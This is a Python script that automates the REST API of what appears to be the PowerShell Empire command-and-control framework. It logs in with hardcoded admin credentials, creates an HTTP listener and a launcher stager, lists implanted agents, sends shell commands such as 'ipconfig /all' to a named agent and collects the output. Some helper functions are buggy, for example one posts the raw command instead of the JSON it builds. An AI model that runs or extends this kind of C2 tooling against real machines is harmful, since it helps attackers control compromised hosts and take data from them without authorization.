import requests
import time
import sqlite3
import json
import re

headers = {
    'Content-Type': 'application/json',
}

data = '{"username":"empireadmin", "password":"Password123!"}'


def get_results():
    response6 = requests.get('https://localhost:1337/api/agents/all/results', params=params, verify=False)
    results = response6.text
    print(results)
    return results

def get_agent_results(agent):
    req = 'https://localhost:1337/api/agents/'+agent+'/results'
    response6 = requests.get(req, params=params, verify=False)
    results = response6.text
    print(results)
    return results


def check_for_agents():
    response4 = requests.get('https://localhost:1337/api/agents', params=params, verify=False)
    agents = response4.text
    agents = str(agents.replace('{"agents":[]}', ''))
    agents = agents.replace('\\n', '')
    agents = agents.replace(r"\\t\\", '')
    agents = agents.replace(r"\t", '')
    agents = agents.replace(r"\\\t", '')

    return agents

def write_agents_to_file():
    check = check_for_agents()
    check.split(',')
    with open ('agents.txt', 'a+') as f:
        for a in range(0, len(check)):
            if check[a] in f.readlines():
                pass
            else:
                f.write(check[a])

def send_command_all(command):
    send_to_all = '{"command":"'+command+'"}'
    response5 = requests.post('https://localhost:1337/api/agents/all/shell', headers=headers, params=params, data=command, verify=False)
    result = get_results()
    print(result)
    return result

def send_command_agent(agent, command):
    agent = agent
    command = '{"command":"' + command+'"}'
    request = 'https://localhost:1337/api/agents/'+agent+'/shell'
    response = requests.post(request, headers=headers, params=params, data=command, verify=False)
    print(response.text)
    result = get_agent_results(agent)
    return result



response = requests.post('https://localhost:1337/api/admin/login', headers=headers, data=data, verify=False)
API_TOKEN = response.text
API_TOKEN = API_TOKEN.replace('{"token":"', '')
API_TOKEN = API_TOKEN.replace('"}', '')
API_TOKEN = API_TOKEN.replace(' ', '')
API_TOKEN = API_TOKEN.replace('\n', '')
print("\n-----------API TOKEN-----------")
print(API_TOKEN +"\n")


params = (
    ('token', API_TOKEN),
)

host = 'https://localhost'
port = '1337'
tID = 0

def agent_shell(agent_name, shell_cmd: str):
    response = requests.post(url=f'{host}:{port}/api/agents/{agent_name}/shell',
                             json={'command': shell_cmd},
                             verify=False,
                             params={'token': API_TOKEN})
    print(json.loads(response.content))
    out = str(json.loads(response.content))
    global tID
    tID = re.sub('\D', '', out)
    tID = tID.strip()
    print(tID)
    return json.loads(response.content), tID



def get_task_result(agent_name, task_id):
        response = requests.get(url=f'{host}:{port}/api/agents/{agent_name}/task/{task_id}',
                                verify=False,
                                params={'token': API_TOKEN})
        print(json.loads(response.content))
        return json.loads(response.content)


# Create listener
listnr_name = '{"Name":"testing"}'

response = requests.post('https://localhost:1337/api/listeners/http', headers=headers, params=params, data=listnr_name, verify=False)    # Verify listener

response3 = requests.get('https://localhost:1337/api/listeners', params=params, verify=False)

# Create Stager
stgr_name = '{"StagerName":"multi/launcher", "Listener":"testing"}'

response = requests.post('https://localhost:1337/api/stagers', headers=headers, params=params, data=stgr_name, verify=False)
response = requests.get('https://localhost:1337/api/stagers', params=params, verify=False)


#check_for_agents()
#send_command_all('ipconfig /all')
agent_shell('KSNGYM7L','ipconfig /all')
get_task_result('KSNGYM7L', tID)
#get_results()
#write_agents_to_file()
